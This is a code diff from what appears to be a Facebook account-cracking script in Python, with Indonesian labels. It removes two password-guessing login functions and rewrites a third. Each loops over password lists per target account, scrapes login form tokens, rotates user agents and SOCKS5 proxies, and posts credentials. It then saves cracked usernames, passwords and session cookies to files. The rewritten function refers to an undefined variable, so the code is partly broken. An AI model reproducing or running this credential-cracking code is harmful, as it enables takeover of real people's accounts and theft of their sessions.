@@ -1592,60 +1592,6 @@ def metcepat():
     )
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
-
-
-def fankym(idf,pwv):
-	global loop,ok,cp
-	rr = random.randint
-	rc = random.choice
-	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen) 
-	ses = requests.Session()
-	prog.update(des, description=f" {K2}•{H2} FANKY NEW {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des) 
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr"
-			headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"}
-			res = ses.get(url, headers=headers)
-			html = res.text
-			soup = BeautifulSoup(html, "html.parser")
-			form = soup.find("form")
-			post_url = "https://www.facebook.com" + form.get("action") if form and form.get("action") else url
-			data_post = {"lsd": re.search(r'name="lsd" value="(.*?)"', html).group(1), "jazoest": re.search(r'name="jazoest" value="(.*?)"', html).group(1), "m_ts": re.search(r'name="m_ts" value="(.*?)"', html).group(1), "li": re.search(r'name="li" value="(.*?)"', html).group(1), "try_number": "0", "unrecognized_tries": "0", "email": idf, "pass": pw, "prefill_contact_point": "", "prefill_source": "", "prefill_type": "", "first_prefill_source": "", "first_prefill_type": "", "had_cp_prefilled": "false", "had_password_prefilled": "false", "is_smart_lock": "false", "bi_xrwh": "0", "_fb_noscript": "true"}
-			head = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Referer": "https://m.facebook.com/", "Origin": "https://m.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1"}
-			po = ses.post(post_url, headers=head, data=data_post)
-			if "checkpoint" in ses.cookies.get_dict().keys():
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok += 1
-				coki = ses.cookies.get_dict()
-				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-
-
 #-------------------[ CRACK-MAIN ]------------#
 def fanb_graph(idf, pwv):
 	global loop, ok, cp
@@ -1856,107 +1802,53 @@ def fankygraphv1(idf, pwv, url):
     loop += 1
 
 #-------------------[ CRACK-MAIN ]------------#
-def fanky_b_apiiiubj(idf,pwv):
-	global loop,ok,cp
-	rr = random.randint
-	rc = random.choice
-	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(ugen) 
-	ses = requests.Session()
-	prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des) 
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			requ=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
-			datasayainifanky = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(requ.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"', str(requ.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(requ.text)).group(1), "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(requ.text)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(requ.text)).group(1), "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
-			kepalafanky= {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,id;q=0.8", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Referer": "https://iphone.facebook.com/", "Cache-Control": "max-age=0", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://iphone.facebook.com", "X-Requested-With": "XMLHttpRequest", "DNT": "1", "X-FB-HTTP-Engine": "Liger"}
-			fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
-			po = session.post(fankyimut,headers=kepalafanky, data=datasayainifanky, allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict():
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
-			elif "c_user" in ses.cookies.get_dict():
-				ok += 1
-				coki = ses.cookies.get_dict()
-				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-
-#-------------------[ CRACK-MAIN ]------------#
 def fanky_b_api(idf, pwv):
-	global loop, ok, cp
-	rr = random.randint
-	rc = random.choice
-	bo = random.choice([m, k, h, b, u, x])
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen)
-	ses = requests.Session()
-	prog.update(des, description=f" {K2}•{H2} FANKY IP baru kiw {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des)
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh:ua = ualu[0]
-			nip = random.choice(prox)
-			proxs = {'http': 'socks5://' + nip}
-			url = "https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9"
-			req = ses.get(url)  
-			soup = BeautifulSoup(req.text, "html.parser")
-			form = soup.find("form")
-			post_action = form.get("action") if form else None
-			if post_action and post_action.startswith("/"):
-				url_post = "https://www.facebook.com" + post_action
-			else:
-				url_post = post_action or "https://www.facebook.com/login/device-based/regular/login/"
-			headers={"User-Agent":ua,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Referer":"https://iphone.facebook.com/","Origin":"https://iphone.facebook.com","Upgrade-Insecure-Requests":"1","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","DNT":"1"}
-			data={"lsd":re.search('name="lsd" value="(.*?)"',req.text).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',req.text).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"',req.text).group(1),"li":re.search('name="li" value="(.*?)"',req.text).group(1),"try_number":"0","unrecognized_tries":"0","prefill_contact_point":idf,"prefill_source":"provided_or_soft_matched","prefill_type":"contact_point","first_prefill_source":"provided_or_soft_matched","first_prefill_type":"contact_point","had_cp_prefilled":"true","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true","email":idf,"pass":pw}
-			po = ses.post(url_post, data=data, headers=headers, allow_redirects=False,proxies=proxs)
-			if "checkpoint" in ses.cookies.get_dict():
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
-			elif "c_user" in ses.cookies.get_dict():
-				ok += 1
-				coki = ses.cookies.get_dict()
-				kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
-				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop += 1
-
+    global loop, ok, cp
+    rr = random.randint
+    rc = random.choice
+    bo = random.choice([m, k, h, b, u, x])
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen)
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} FANKY IP baru kiw {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh:ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            url = "https://iphone.facebook.com/login.php?"
+            req = ses.get(url)  
+            data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(requ.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"', str(requ.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(requ.text)).group(1), "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(requ.text)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(requ.text)).group(1), "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
+            head = {'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.166 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Referer': 'https://www.facebook.com/', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'X-FB-LSD': re.search(r'name="lsd" value="(.*?)"', requ.text).group(1), 'X-Requested-With': 'XMLHttpRequest', 'Sec-Ch-Ua': '"Chromium";v="134", "Not-A.Brand";v="99"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'DNT': '1', 'Pragma': 'no-cache'}
+            fankypost = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            po = ses.post(fankypost, headers=head, data=data, allow_redirects=False)
+            if "checkpoint" in ses.cookies.get_dict():
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif "c_user" in ses.cookies.get_dict():
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
